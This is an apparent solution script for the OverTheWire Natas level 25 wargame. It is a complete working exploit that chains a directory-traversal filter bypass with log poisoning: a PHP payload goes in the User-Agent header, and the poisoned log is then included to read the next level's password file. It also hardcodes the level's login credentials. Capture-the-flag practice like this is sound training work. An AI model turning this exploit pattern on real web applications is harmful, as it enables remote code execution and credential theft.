import requests

URL = "http://natas25.natas.labs.overthewire.org/?revelio=1"
AUTH = ("natas25", "UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo")

sesh = requests.Session()
sesh.auth = AUTH

mal_header = {"User-Agent" : "<?php echo file_get_contents('/etc/natas_webpass/natas26'); ?>"}
dir_trav = "..././..././..././..././..././var/www/natas/natas25/logs/natas25_"

response = sesh.get(URL)
print(f"Acquired PHPSESSID cookie : {sesh.cookies["PHPSESSID"]}")
print(f"Running mal payload on {URL} with header {mal_header} and lang data {dir_trav + sesh.cookies['PHPSESSID']}")
response = sesh.post(url=URL, headers=mal_header, data={"lang" : dir_trav + sesh.cookies["PHPSESSID"] + ".log"})
print(response.text)